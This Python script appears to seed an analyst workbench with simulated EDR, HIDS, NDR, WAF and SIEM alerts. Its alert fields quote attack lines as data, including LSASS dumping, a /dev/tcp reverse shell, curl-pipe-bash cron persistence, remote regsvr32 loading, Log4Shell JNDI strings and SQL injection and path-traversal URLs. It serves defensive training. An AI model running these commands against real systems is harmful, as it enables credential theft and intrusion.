# -*- coding: utf-8 -*-
"""
多源安全告警模拟数据生成器
------------------------------------------------------------------
为「研判分析工作台」批量生成逼真的多类型安全告警，覆盖：
  EDR / HIDS / NDR(流量探针) / WAF / SIEM / 其他
每条告警附带：
  1) 一张随设备类型自适应渲染的控制台告警详情截图（PNG）
  2) 一份与设备类型匹配的取证日志（.log：主机 Sysmon / 网络流 / Web 访问）
并覆盖多种研判结论（真实攻击 / 疑似 / 误报 / 正常业务）与处置状态。

直接调用后端服务层写入 SQLite，无需启动 Flask / 无需网络。

用法：
    python tools/seed_edr_alerts.py                 # 生成全部
    python tools/seed_edr_alerts.py --no-image      # 不生成截图
    python tools/seed_edr_alerts.py --only edr,waf  # 仅生成指定类型
"""
import io
import os
import sys
import argparse
from datetime import datetime, timedelta, timezone

ROOT = os.path.abspath(os.path.join(os.path.dirname(__file__), ".."))
sys.path.insert(0, ROOT)

from backend.services import incident_service  # noqa: E402

try:
    from werkzeug.datastructures import FileStorage  # noqa: E402
except Exception as exc:  # pragma: no cover
    print("需要 werkzeug（随 Flask 安装）:", exc)
    sys.exit(1)

try:
    from PIL import Image, ImageDraw, ImageFont
    HAS_PIL = True
except Exception:
    HAS_PIL = False


CST = timezone(timedelta(hours=8))


def t(day_offset, hour, minute):
    base = datetime.now(CST).replace(second=0, microsecond=0)
    return (base + timedelta(days=day_offset)).replace(hour=hour, minute=minute).isoformat()


# ============================================================
# 告警数据集（按设备类型分组）
# ============================================================
EDR = [
    {
        "title": "检测到 LSASS 进程内存转储（疑似凭证窃取）",
        "source_system": "奇安信 天擎 EDR", "source_product": "QAX TianQing EDR 6.8",
        "alert_type": "凭证访问 / Credential Dumping", "severity": "critical", "status": "investigating",
        "reporter": "soc_zhangwei", "owner": "ir_lina", "occurred_at": t(-1, 2, 17),
        "hostname": "FIN-DB-03", "username": "NT AUTHORITY\\SYSTEM", "process_name": "rundll32.exe",
        "command_line": r'rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Windows\Temp\lsass.dmp full',
        "file_path": r"C:\Windows\Temp\lsass.dmp",
        "file_hash": "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "source_ip": "10.18.32.41", "destination_ip": "10.18.32.7",
        "rule_id": "EDR-CRED-1003", "rule_name": "comsvcs.dll MiniDump LSASS 内存转储",
        "mitre": "T1003.001 LSASS Memory", "parent_process": "cmd.exe",
        "description": "终端 FIN-DB-03 上 rundll32.exe 调用 comsvcs.dll 的 MiniDump 导出函数，对 PID 712（lsass.exe）进行完整内存转储并落地 lsass.dmp。父进程为 cmd.exe，由计划任务触发，疑似攻击者已获得本地 SYSTEM 权限并尝试窃取域凭证。",
        "key_evidence": "lsass.dmp 已落地；rundll32 命令行包含 comsvcs.dll MiniDump；进程链 cmd.exe -> rundll32.exe",
        "handling_suggestion": "立即隔离主机、保全内存转储样本、重置该主机及关联域账号口令，排查计划任务来源。",
    },
    {
        "title": "PowerShell 执行 Base64 编码载荷并外联可疑 C2",
        "source_system": "Microsoft Defender for Endpoint", "source_product": "MDE / Defender XDR",
        "alert_type": "命令与控制 / Cobalt Strike Beacon", "severity": "critical", "status": "pending",
        "reporter": "soc_chenhao", "owner": "", "occurred_at": t(0, 9, 42),
        "hostname": "HR-PC-118", "username": "CORP\\wang.fang", "process_name": "powershell.exe",
        "command_line": "powershell.exe -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADQANQAuADEANAA2AC4A",
        "file_path": r"C:\Users\wang.fang\AppData\Local\Temp\update.ps1",
        "file_hash": "9f2b8e1c7d4a6f0b3c5e8a1d2f4b6c8e0a2c4e6f8b0d2f4a6c8e0b2d4f6a8c0e",
        "source_ip": "10.22.7.118", "destination_ip": "45.146.19.77", "destination_port": "443",
        "domain": "cdn-update-srv.com", "rule_id": "EDR-C2-2048", "rule_name": "PowerShell 隐藏窗口 + 编码命令 + 外联",
        "mitre": "T1059.001 / T1071.001", "parent_process": "WINWORD.EXE",
        "description": "用户主机 HR-PC-118 的 WINWORD.EXE 派生 powershell.exe，以 -w hidden -enc 方式执行 Base64 载荷，解码后向 hxxp://45.146.19.77/a 发起下载并建立 HTTPS 长连接，外联域名命中威胁情报。典型钓鱼文档投递 Cobalt Strike Beacon 行为。",
        "key_evidence": "WINWORD->powershell 进程链；-enc 解码后为下载 cradle；外联 45.146.19.77:443 命中 TI",
        "handling_suggestion": "封禁 C2 IP/域名，隔离主机，溯源钓鱼邮件并全网检索同源附件 Hash。",
    },
    {
        "title": "勒索软件行为：批量文件加密 + 删除卷影副本",
        "source_system": "CrowdStrike Falcon", "source_product": "Falcon Insight XDR",
        "alert_type": "数据加密勒索 / Ransomware", "severity": "critical", "status": "investigating", "conclusion": "true_positive",
        "reporter": "soc_zhangwei", "owner": "ir_lina", "occurred_at": t(-2, 23, 5),
        "hostname": "FILE-SRV-07", "username": "CORP\\svc_fileshare", "process_name": "svchost-update.exe",
        "command_line": r'"C:\ProgramData\svchost-update.exe" -enc-all -ext .lockxz -k 2A9F',
        "file_path": r"C:\ProgramData\svchost-update.exe",
        "file_hash": "a7c3f0e9b2d18465f7a0c2e4d6b8f0a1c3e5d7b9f1a3c5e7d9b1f3a5c7e9d0b2",
        "source_ip": "10.30.5.7", "rule_id": "EDR-RANSOM-3301", "rule_name": "高频文件改写 + vssadmin 删除卷影",
        "mitre": "T1486 / T1490", "parent_process": "PSEXESVC.exe",
        "description": "文件服务器 FILE-SRV-07 上伪装为 svchost-update.exe 的进程在 90 秒内改写 4300+ 个文件并追加 .lockxz 扩展名，随后执行 vssadmin delete shadows /all /quiet 删除卷影副本并写入勒索信。进程由 PSEXESVC.exe 拉起，提示已发生横向移动。",
        "key_evidence": "4300+ 文件被改写为 .lockxz；vssadmin 删除卷影；勒索信 README_RESTORE.txt；PsExec 横向",
        "handling_suggestion": "立即断网隔离，保全样本与勒索信，启动备份恢复流程，全网排查 PsExec 来源主机。",
    },
    {
        "title": "通过 PsExec 进行横向移动（ADMIN$ 远程执行）",
        "source_system": "奇安信 天擎 EDR", "source_product": "QAX TianQing EDR 6.8",
        "alert_type": "横向移动 / Lateral Movement", "severity": "high", "status": "investigating",
        "reporter": "soc_chenhao", "owner": "ir_zhao", "occurred_at": t(-2, 22, 48),
        "hostname": "FILE-SRV-07", "username": "CORP\\administrator", "process_name": "PSEXESVC.exe",
        "command_line": r"C:\Windows\PSEXESVC.exe",
        "file_hash": "3c6d8f0a2b4e6c8d0f2a4b6c8e0d2f4a6b8c0e2d4f6a8b0c2e4d6f8a0b2c4e6d",
        "source_ip": "10.22.7.118", "destination_ip": "10.30.5.7", "destination_port": "445",
        "rule_id": "EDR-LAT-2210", "rule_name": "PSEXESVC 服务安装 + ADMIN$ 写入",
        "mitre": "T1021.002 SMB Admin Shares", "parent_process": "services.exe",
        "description": "源主机 HR-PC-118（10.22.7.118）通过 SMB 向 FILE-SRV-07 的 ADMIN$ 共享写入 PSEXESVC.exe 并注册同名服务，以 administrator 凭据远程执行命令。该事件与 FILE-SRV-07 上的勒索加密告警时间高度吻合，构成完整攻击链。",
        "key_evidence": "ADMIN$ 写入 PSEXESVC.exe；services.exe 拉起服务；源主机为已失陷的 HR-PC-118",
        "handling_suggestion": "隔离源主机与目标主机，重置 administrator 口令，审计域内 PsExec 使用情况。",
    },
    {
        "title": "可疑本地管理员账号创建并加入管理员组",
        "source_system": "CrowdStrike Falcon", "source_product": "Falcon Insight XDR",
        "alert_type": "账号操纵 / Account Manipulation", "severity": "high", "status": "investigating",
        "reporter": "soc_zhangwei", "owner": "ir_zhao", "occurred_at": t(-1, 1, 53),
        "hostname": "FIN-DB-03", "username": "NT AUTHORITY\\SYSTEM", "process_name": "net.exe",
        "command_line": r"net localgroup administrators sysbackup$ /add",
        "source_ip": "10.18.32.41", "rule_id": "EDR-PERSIST-1640", "rule_name": "隐藏账号（$ 结尾）加入管理员组",
        "mitre": "T1136.001 / T1098", "parent_process": "cmd.exe",
        "description": "数据库服务器 FIN-DB-03 上以 SYSTEM 权限创建隐藏账号 sysbackup$（账号名以 $ 结尾，net user 列表中不可见）并加入 administrators 组。与该主机 LSASS 转储告警同源。",
        "key_evidence": "创建 $ 结尾隐藏账号 sysbackup$；加入 administrators 组；与 LSASS 转储同主机同时段",
        "handling_suggestion": "禁用并删除该账号，排查所有主机的隐藏账号，结合 LSASS 告警按失陷主机处置。",
    },
    {
        "title": "regsvr32 远程加载脚本（Squiblydoo LOLBin 滥用）",
        "source_system": "奇安信 天擎 EDR", "source_product": "QAX TianQing EDR 6.8",
        "alert_type": "防御绕过 / Defense Evasion", "severity": "medium", "status": "pending",
        "reporter": "soc_chenhao", "owner": "", "occurred_at": t(0, 11, 16),
        "hostname": "SALES-PC-051", "username": "CORP\\zhou.min", "process_name": "regsvr32.exe",
        "command_line": r"regsvr32.exe /s /n /u /i:http://185.220.101.45/x.sct scrobj.dll",
        "source_ip": "10.25.9.51", "destination_ip": "185.220.101.45", "destination_port": "80", "domain": "x.sct",
        "rule_id": "EDR-DEFEVA-1771", "rule_name": "regsvr32 /i 远程 scriptlet 加载",
        "mitre": "T1218.010 Regsvr32", "parent_process": "outlook.exe",
        "description": "终端 SALES-PC-051 的 outlook.exe 派生 regsvr32.exe，通过 /i 参数从 hxxp://185.220.101.45/x.sct 加载远程 scriptlet 并由 scrobj.dll 执行，绕过应用白名单。源头疑为邮件链接。",
        "key_evidence": "regsvr32 /i 远程 .sct；outlook->regsvr32 进程链；外联 185.220.101.45",
        "handling_suggestion": "封禁外联地址，提取 x.sct 内容研判下一阶段载荷，排查邮件来源。",
    },
    {
        "title": "红队演练触发 Mimikatz 检测（已确认为授权测试）",
        "source_system": "Microsoft Defender for Endpoint", "source_product": "MDE / Defender XDR",
        "alert_type": "凭证访问 / Credential Dumping", "severity": "high", "status": "closed", "conclusion": "false_positive",
        "reporter": "soc_liyang", "owner": "ir_lina", "occurred_at": t(-3, 15, 30),
        "hostname": "REDTEAM-LAB-02", "username": "LAB\\pentester", "process_name": "mimikatz.exe",
        "command_line": r'mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit',
        "file_path": r"C:\Tools\mimikatz\x64\mimikatz.exe",
        "file_hash": "61c0810a23e9c5d0e1b2f3a4c5d6e7f8091a2b3c4d5e6f708192a3b4c5d6e7f8",
        "source_ip": "10.99.0.12", "rule_id": "EDR-CRED-1001", "rule_name": "Mimikatz sekurlsa 内存读取",
        "mitre": "T1003.001 LSASS Memory", "parent_process": "powershell.exe",
        "description": "REDTEAM-LAB-02 触发 Mimikatz 凭证读取检测，经与红队负责人核实，属于本周授权的内网渗透演练范围（变更单 CHG-2026-0612），目标主机为隔离的演练环境。",
        "key_evidence": "主机位于隔离演练网段 10.99.0.0/24；操作账号 pentester；已匹配变更单 CHG-2026-0612",
        "handling_suggestion": "确认为授权红队演练，关闭告警并加入演练白名单，演练结束后复核。",
    },
    {
        "title": "运维使用 PsExec 批量分发补丁（正常业务）",
        "source_system": "VMware Carbon Black", "source_product": "Carbon Black Cloud",
        "alert_type": "横向移动 / Lateral Movement", "severity": "medium", "status": "closed", "conclusion": "business",
        "reporter": "soc_liyang", "owner": "ops_admin", "occurred_at": t(-1, 20, 12),
        "hostname": "OPS-JUMP-01", "username": "CORP\\ops_patch", "process_name": "PsExec64.exe",
        "command_line": r'PsExec64.exe @hosts.txt -u CORP\ops_patch -s cmd /c "wusa kb5039xxx.msu /quiet"',
        "source_ip": "10.50.1.10", "destination_port": "445",
        "rule_id": "EDR-LAT-2210", "rule_name": "PsExec 远程批量执行",
        "mitre": "T1021.002 SMB Admin Shares", "parent_process": "powershell.exe",
        "description": "运维跳板机 OPS-JUMP-01 使用 PsExec64 通过 hosts.txt 批量向终端推送 Windows 补丁，账号为已知运维账号 ops_patch，发生在变更窗口内，属于正常运维行为。",
        "key_evidence": "源为运维跳板机；账号 ops_patch；目标为 hosts.txt 中的资产；处于补丁变更窗口",
        "handling_suggestion": "确认为计划内补丁分发，标记为正常业务，建议将运维跳板机 PsExec 行为纳入基线。",
    },
]

HIDS = [
    {
        "title": "SSH 暴力破解成功登录（境外 IP）",
        "source_system": "青藤云 HIDS", "source_product": "Qingteng Agent",
        "alert_type": "凭证访问 / Brute Force", "severity": "high", "status": "investigating",
        "reporter": "soc_chenhao", "owner": "ir_zhao", "occurred_at": t(0, 4, 6),
        "hostname": "web-node-12", "username": "root", "process_name": "sshd",
        "command_line": "sshd: root@notty",
        "event_action": "登录成功（前置 1273 次失败）",
        "source_ip": "103.97.56.22", "destination_ip": "172.16.20.12", "destination_port": "22",
        "rule_id": "HIDS-BF-0420", "rule_name": "SSH 短时间高频失败后成功登录",
        "mitre": "T1110 Brute Force",
        "description": "Linux 主机 web-node-12 的 /var/log/secure 显示，来自境外 IP 103.97.56.22 在 8 分钟内对 root 账号发起 1273 次失败登录后成功登录，随即创建新会话，疑似口令爆破得手。",
        "key_evidence": "1273 次失败后成功登录；源 IP 103.97.56.22 为境外；root 直接登录（违反基线）",
        "handling_suggestion": "立即重置 root 口令、禁用 root 远程登录、封禁源 IP，检查是否落地后门与持久化。",
    },
    {
        "title": "SSH authorized_keys 被异常写入（持久化后门）",
        "source_system": "青藤云 HIDS", "source_product": "Qingteng Agent",
        "alert_type": "持久化 / Persistence", "severity": "high", "status": "pending",
        "reporter": "soc_chenhao", "owner": "", "occurred_at": t(0, 4, 11),
        "hostname": "web-node-12", "username": "root", "process_name": "bash",
        "command_line": "echo 'ssh-rsa AAAAB3Nza...attacker' >> /root/.ssh/authorized_keys",
        "file_path": "/root/.ssh/authorized_keys", "event_action": "文件追加写入",
        "source_ip": "172.16.20.12",
        "rule_id": "HIDS-PERSIST-0511", "rule_name": "authorized_keys 异常写入",
        "mitre": "T1098.004 SSH Authorized Keys",
        "description": "主机 web-node-12 上 /root/.ssh/authorized_keys 被追加一条未知公钥，操作发生在 SSH 爆破成功登录之后 5 分钟，攻击者植入免密登录后门以维持访问。",
        "key_evidence": "authorized_keys 新增未知公钥；时间紧随爆破成功；写入进程为交互式 bash",
        "handling_suggestion": "清除非法公钥，排查 .ssh 目录权限与其它账号，结合爆破告警按失陷处置。",
    },
    {
        "title": "反弹 Shell：bash 重定向到 /dev/tcp 外联",
        "source_system": "安全狗 HIDS", "source_product": "SafeDog ServerProtect",
        "alert_type": "命令与控制 / Reverse Shell", "severity": "critical", "status": "investigating",
        "reporter": "soc_zhangwei", "owner": "ir_lina", "occurred_at": t(-1, 19, 33),
        "hostname": "app-pay-05", "username": "tomcat", "process_name": "bash",
        "command_line": "bash -i >& /dev/tcp/45.32.118.9/4444 0>&1",
        "event_action": "进程创建", "source_ip": "10.60.3.5", "destination_ip": "45.32.118.9", "destination_port": "4444",
        "rule_id": "HIDS-RSHELL-0733", "rule_name": "bash /dev/tcp 反弹 Shell",
        "mitre": "T1059.004 Unix Shell", "parent_process": "java",
        "description": "支付应用主机 app-pay-05 上由 java（Tomcat）进程派生 bash 并执行 /dev/tcp 反弹 Shell，向 45.32.118.9:4444 建立交互式连接，疑似 Web 应用漏洞被利用后获取主机权限。",
        "key_evidence": "java->bash 进程链；/dev/tcp/45.32.118.9/4444 反弹；tomcat 账号执行交互 shell",
        "handling_suggestion": "隔离主机、封禁外联、保全 Tomcat 访问日志定位入口漏洞，排查 webapps 目录后门。",
    },
    {
        "title": "crontab 植入可疑定时任务（挖矿持久化）",
        "source_system": "青藤云 HIDS", "source_product": "Qingteng Agent",
        "alert_type": "持久化 / Persistence", "severity": "medium", "status": "pending",
        "reporter": "soc_liyang", "owner": "", "occurred_at": t(-1, 3, 50),
        "hostname": "app-pay-05", "username": "tomcat", "process_name": "crontab",
        "command_line": "*/10 * * * * curl -fsSL http://45.32.118.9/m.sh | bash",
        "file_path": "/var/spool/cron/tomcat", "event_action": "计划任务创建",
        "source_ip": "10.60.3.5", "destination_ip": "45.32.118.9",
        "rule_id": "HIDS-PERSIST-0540", "rule_name": "crontab 写入网络下载执行任务",
        "mitre": "T1053.003 Cron",
        "description": "主机 app-pay-05 的 tomcat 用户 crontab 新增每 10 分钟从 45.32.118.9 下载 m.sh 并执行的任务，与反弹 Shell 告警同主机同源，疑为挖矿/驻留脚本。",
        "key_evidence": "crontab 每 10 分钟 curl|bash；下载源与反弹 Shell C2 一致；用户 tomcat",
        "handling_suggestion": "清除恶意 cron 条目，抓取 m.sh 研判载荷，结合反弹 Shell 告警一并处置。",
    },
    {
        "title": "sudoers 文件批量变更（已确认为配置管理下发）",
        "source_system": "安全狗 HIDS", "source_product": "SafeDog ServerProtect",
        "alert_type": "权限提升 / Privilege Escalation", "severity": "low", "status": "closed", "conclusion": "false_positive",
        "reporter": "soc_liyang", "owner": "ops_admin", "occurred_at": t(-2, 10, 22),
        "hostname": "app-pay-05", "username": "root", "process_name": "ansible-playbook",
        "command_line": "/usr/bin/python3 ansible sudoers.yml --limit pay-group",
        "file_path": "/etc/sudoers.d/90-ops", "event_action": "文件修改",
        "source_ip": "10.50.1.10",
        "rule_id": "HIDS-PRIV-0301", "rule_name": "sudoers 文件被修改",
        "mitre": "T1548.003 Sudo",
        "description": "多台主机 /etc/sudoers.d/ 文件在同一时刻被修改，来源为配置管理跳板机 10.50.1.10 的 Ansible 下发（剧本 sudoers.yml），属于计划内的权限基线统一变更。",
        "key_evidence": "变更由 ansible-playbook 触发；来源为运维 CMDB 跳板机；多主机同时一致变更",
        "handling_suggestion": "确认为配置管理下发，标记误报并纳入白名单，建议变更前与安全团队报备。",
    },
]

NDR = [
    {
        "title": "DNS 隧道外联（超长子域名 + 高频请求）",
        "source_system": "科来 NDR", "source_product": "Colasoft NDR Probe",
        "alert_type": "命令与控制 / DNS Tunneling", "severity": "high", "status": "investigating",
        "reporter": "soc_chenhao", "owner": "ir_zhao", "occurred_at": t(0, 8, 14),
        "source_ip": "10.22.7.118", "source_port": "51344", "destination_ip": "8.8.8.8", "destination_port": "53",
        "protocol": "UDP/DNS", "domain": "a3f9c2e1b7d4.tunnel-dns-c2.xyz",
        "rule_id": "NDR-C2-3120", "rule_name": "DNS 隧道：超长子域名高频 TXT 查询",
        "mitre": "T1071.004 DNS",
        "description": "流量探针发现内网主机 10.22.7.118 在 3 分钟内向 tunnel-dns-c2.xyz 发起 480+ 次超长随机子域名的 DNS TXT 查询，单位时间请求量与熵值远超基线，典型 DNS 隧道数据外带/C2 信道特征。",
        "key_evidence": "480+ 次随机超长子域名 TXT 查询；目标域 tunnel-dns-c2.xyz；熵值异常高",
        "handling_suggestion": "在 DNS 层封禁该域名，定位 10.22.7.118 终端进程（疑与 C2 告警同主机），抓包取证。",
    },
    {
        "title": "门罗币挖矿矿池连接（Stratum 协议）",
        "source_system": "科来 NDR", "source_product": "Colasoft NDR Probe",
        "alert_type": "资源劫持 / Cryptojacking", "severity": "medium", "status": "pending",
        "reporter": "soc_liyang", "owner": "", "occurred_at": t(-1, 2, 41),
        "source_ip": "10.60.3.5", "source_port": "49920", "destination_ip": "51.91.23.140", "destination_port": "3333",
        "protocol": "TCP/Stratum", "domain": "pool.minexmr-fast.com",
        "rule_id": "NDR-MINER-3208", "rule_name": "Stratum 挖矿协议握手",
        "mitre": "T1496 Resource Hijacking",
        "description": "探针解析到 app-pay-05（10.60.3.5）向 51.91.23.140:3333 建立 Stratum 协议连接并完成 mining.subscribe / mining.authorize 握手，目标为已知门罗币矿池，主机疑似被植入挖矿程序。",
        "key_evidence": "Stratum mining.subscribe 握手；目标矿池 pool.minexmr-fast.com:3333；与 crontab 持久化同主机",
        "handling_suggestion": "封禁矿池地址，定位挖矿进程与持久化，结合该主机 HIDS 告警整体处置。",
    },
    {
        "title": "内网横向：单主机高频 SMB/445 端口扫描",
        "source_system": "天眼 NDR", "source_product": "QAX NetworkTrap",
        "alert_type": "侦察 / Network Service Scanning", "severity": "medium", "status": "pending",
        "reporter": "soc_chenhao", "owner": "", "occurred_at": t(-2, 22, 30),
        "source_ip": "10.22.7.118", "source_port": "0", "destination_ip": "10.30.0.0/16", "destination_port": "445",
        "protocol": "TCP", "rule_id": "NDR-SCAN-3050", "rule_name": "单源高频内网端口扫描",
        "mitre": "T1046 Network Service Scanning",
        "description": "探针检测到 10.22.7.118 在 2 分钟内向 10.30.0.0/16 网段 600+ 主机的 445 端口发起 SYN 探测，呈横向扫描特征，时间早于 FILE-SRV-07 的 PsExec 横向告警。",
        "key_evidence": "2 分钟扫描 600+ 主机 445 端口；源主机 10.22.7.118；先于 PsExec 横向发生",
        "handling_suggestion": "隔离源主机，结合 EDR 横向告警判定攻击路径，临时收敛 445 端口暴露面。",
    },
    {
        "title": "数据外传：非工作时间大流量上传至云存储",
        "source_system": "天眼 NDR", "source_product": "QAX NetworkTrap",
        "alert_type": "数据渗出 / Exfiltration", "severity": "high", "status": "investigating",
        "reporter": "soc_zhangwei", "owner": "ir_lina", "occurred_at": t(-1, 3, 12),
        "source_ip": "10.18.32.41", "source_port": "52210", "destination_ip": "13.227.74.30", "destination_port": "443",
        "protocol": "TCP/TLS", "domain": "upload.mega-share.io",
        "url": "https://upload.mega-share.io/v2/files",
        "rule_id": "NDR-EXFIL-3401", "rule_name": "非工作时段异常大流量外传",
        "mitre": "T1567.002 Exfiltration to Cloud Storage",
        "description": "凌晨 03:12 探针发现数据库主机 FIN-DB-03（10.18.32.41）向境外云存储 upload.mega-share.io 上行约 6.8 GB 加密流量，远超该主机历史基线，疑为敏感数据外带。该主机此前有凭证窃取告警。",
        "key_evidence": "凌晨上行 6.8GB 至 mega-share.io；远超基线；源主机 FIN-DB-03 此前有 LSASS 转储告警",
        "handling_suggestion": "阻断外联会话，核查上传内容与数据库导出记录，按数据泄露事件升级处置。",
    },
    {
        "title": "大流量外联触发阈值（确认为云备份任务）",
        "source_system": "科来 NDR", "source_product": "Colasoft NDR Probe",
        "alert_type": "数据渗出 / Exfiltration", "severity": "low", "status": "closed", "conclusion": "business",
        "reporter": "soc_liyang", "owner": "ops_admin", "occurred_at": t(-3, 1, 0),
        "source_ip": "10.30.5.20", "source_port": "44120", "destination_ip": "47.88.12.6", "destination_port": "443",
        "protocol": "TCP/TLS", "domain": "oss-cn-hangzhou.aliyuncs.com",
        "rule_id": "NDR-EXFIL-3401", "rule_name": "非工作时段异常大流量外传",
        "mitre": "T1567.002 Exfiltration to Cloud Storage",
        "description": "备份服务器 BACKUP-01（10.30.5.20）每日 01:00 向阿里云 OSS 上传约 120GB 数据，触发大流量外传阈值。经核实为既定的异地容灾备份任务，目标为公司自有 OSS 桶。",
        "key_evidence": "源为备份服务器；目标为公司自有阿里云 OSS；每日定时、流量稳定；有备份作业记录",
        "handling_suggestion": "确认为正常容灾备份，加入流量基线白名单，避免重复告警。",
    },
]

WAF = [
    {
        "title": "SQL 注入攻击（UNION 注入读取数据库）",
        "source_system": "长亭 雷池 WAF", "source_product": "SafeLine WAF",
        "alert_type": "Web 攻击 / SQL Injection", "severity": "high", "status": "investigating",
        "reporter": "soc_chenhao", "owner": "ir_zhao", "occurred_at": t(0, 10, 5),
        "source_ip": "203.0.113.88", "destination_ip": "172.16.8.22", "domain": "shop.example.com",
        "url": "https://shop.example.com/product?id=1%20UNION%20SELECT%20username,password%20FROM%20users--",
        "http_method": "GET", "http_status": "403", "user_agent": "sqlmap/1.8.2#stable (https://sqlmap.org)",
        "rule_id": "WAF-SQLI-0901", "rule_name": "UNION SELECT 联合查询注入",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "WAF 拦截到来自 203.0.113.88 针对 shop.example.com 商品接口的 UNION SELECT 注入尝试，User-Agent 为 sqlmap，短时间内有上百条同源注入 payload，目标读取 users 表凭据。当前请求已被拦截（403）。",
        "key_evidence": "UNION SELECT ... FROM users 注入；UA=sqlmap；同源高频 payload；WAF 已拦截 403",
        "handling_suggestion": "确认拦截有效，封禁源 IP，复核接口是否存在可绕过点与历史成功注入。",
    },
    {
        "title": "Log4Shell 漏洞利用尝试（JNDI 注入）",
        "source_system": "长亭 雷池 WAF", "source_product": "SafeLine WAF",
        "alert_type": "Web 攻击 / RCE", "severity": "critical", "status": "pending",
        "reporter": "soc_zhangwei", "owner": "", "occurred_at": t(0, 7, 51),
        "source_ip": "198.51.100.23", "destination_ip": "172.16.8.30", "domain": "api.example.com",
        "url": "https://api.example.com/login",
        "http_method": "POST", "http_status": "200",
        "user_agent": "${jndi:ldap://198.51.100.23:1389/Exploit}",
        "rule_id": "WAF-RCE-0044", "rule_name": "Log4j JNDI 注入（CVE-2021-44228）",
        "mitre": "T1190 Exploit Public-Facing Application",
        "description": "WAF 在 api.example.com 登录接口的 User-Agent 头中检测到 ${jndi:ldap://...} 注入串，尝试触发 Log4Shell 远程类加载。该请求返回 200，需确认后端是否使用受影响 Log4j 版本及是否成功外联 LDAP。",
        "key_evidence": "UA 头含 ${jndi:ldap://198.51.100.23:1389/Exploit}；目标登录接口；响应 200 需复核",
        "handling_suggestion": "确认后端 Log4j 版本并升级/加缓解参数，检查是否有到 198.51.100.23:1389 的外联，封禁源 IP。",
    },
    {
        "title": "Web 文件上传 Webshell（绕过后缀校验）",
        "source_system": "安恒 玄武盾 WAF", "source_product": "DAS WebGuard",
        "alert_type": "Web 攻击 / Web Shell Upload", "severity": "high", "status": "pending",
        "reporter": "soc_liyang", "owner": "", "occurred_at": t(-1, 16, 47),
        "source_ip": "198.51.100.66", "destination_ip": "172.16.8.22", "domain": "shop.example.com",
        "url": "https://shop.example.com/upload?filename=1.aspx;.jpg",
        "http_method": "POST", "http_status": "200", "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
        "rule_id": "WAF-UPLOAD-0610", "rule_name": "可疑文件上传：双扩展名 / 脚本类型",
        "mitre": "T1505.003 Web Shell",
        "description": "shop.example.com 上传接口收到文件名为 1.aspx;.jpg 的 POST 请求，疑似利用解析漏洞绕过后缀校验上传 ASPX Webshell，响应 200。源 IP 198.51.100.66 与 DMZ-WEB-02 的 EDR Webshell 告警一致。",
        "key_evidence": "上传 1.aspx;.jpg 双扩展名；响应 200；源 IP 与 EDR Webshell 告警同源",
        "handling_suggestion": "核查上传目录是否落地 1.aspx，删除后门并修复上传校验，结合 EDR 告警按入侵处置。",
    },
    {
        "title": "目录穿越读取系统文件",
        "source_system": "安恒 玄武盾 WAF", "source_product": "DAS WebGuard",
        "alert_type": "Web 攻击 / Path Traversal", "severity": "medium", "status": "pending",
        "reporter": "soc_chenhao", "owner": "", "occurred_at": t(-1, 13, 2),
        "source_ip": "203.0.113.150", "destination_ip": "172.16.8.30", "domain": "api.example.com",
        "url": "https://api.example.com/download?file=../../../../etc/passwd",
        "http_method": "GET", "http_status": "403", "user_agent": "curl/8.4.0",
        "rule_id": "WAF-LFI-0322", "rule_name": "路径穿越 ../ 读取敏感文件",
        "mitre": "T1083 File and Directory Discovery",
        "description": "WAF 拦截到 api.example.com 下载接口的 file 参数包含 ../../../../etc/passwd 路径穿越 payload，尝试读取系统敏感文件，已被拦截（403）。来源 203.0.113.150 存在多次探测。",
        "key_evidence": "file=../../../../etc/passwd；多次穿越探测；WAF 已拦截 403",
        "handling_suggestion": "确认下载接口已做路径规范化，封禁源 IP，复核是否存在未经 WAF 的直连路径。",
    },
    {
        "title": "WAF 拦截疑似攻击（确认为业务方授权扫描）",
        "source_system": "长亭 雷池 WAF", "source_product": "SafeLine WAF",
        "alert_type": "Web 攻击 / Scanner", "severity": "low", "status": "closed", "conclusion": "false_positive",
        "reporter": "soc_liyang", "owner": "appsec_team", "occurred_at": t(-2, 14, 38),
        "source_ip": "10.70.2.30", "destination_ip": "172.16.8.22", "domain": "shop.example.com",
        "url": "https://shop.example.com/?scan=acunetix-wvs-test",
        "http_method": "GET", "http_status": "403", "user_agent": "Mozilla/5.0 (compatible; acunetix-wvs)",
        "rule_id": "WAF-SCAN-0701", "rule_name": "已知漏洞扫描器特征",
        "mitre": "T1595 Active Scanning",
        "description": "WAF 拦截到来自内网 10.70.2.30 的大量带扫描器特征（acunetix）的请求。经核实为应用安全团队对 shop.example.com 的季度授权渗透扫描（计划单 SEC-SCAN-2026Q2），非真实攻击。",
        "key_evidence": "源为内网 AppSec 扫描机 10.70.2.30；UA=acunetix；匹配计划单 SEC-SCAN-2026Q2",
        "handling_suggestion": "确认为授权扫描，临时加入扫描白名单并标记误报，扫描结束后移除白名单。",
    },
]

SIEM = [
    {
        "title": "异常登录：不可能旅行（异地短时双登录）",
        "source_system": "Splunk Enterprise Security", "source_product": "Splunk ES",
        "alert_type": "凭证滥用 / Valid Accounts", "severity": "high", "status": "investigating",
        "reporter": "soc_chenhao", "owner": "ir_zhao", "occurred_at": t(0, 6, 33),
        "hostname": "VPN-GW / O365", "username": "CORP\\li.qiang",
        "source_ip": "203.0.113.45", "destination_ip": "", "domain": "login.microsoftonline.com",
        "rule_id": "SIEM-AUTH-5012", "rule_name": "Impossible Travel 不可能旅行",
        "mitre": "T1078 Valid Accounts",
        "description": "关联多源认证日志发现账号 li.qiang 在 35 分钟内分别从杭州（10.x VPN）与境外 203.0.113.45 成功登录 O365，地理位移不可能在该时间内完成，疑似账号凭据泄露被异地使用。",
        "key_evidence": "35 分钟内杭州与境外双成功登录；地理不可能旅行；账号 li.qiang",
        "handling_suggestion": "强制下线并重置该账号、启用 MFA，核查邮箱规则与近期访问，排查钓鱼来源。",
    },
    {
        "title": "密码喷洒攻击导致多账号锁定",
        "source_system": "Splunk Enterprise Security", "source_product": "Splunk ES",
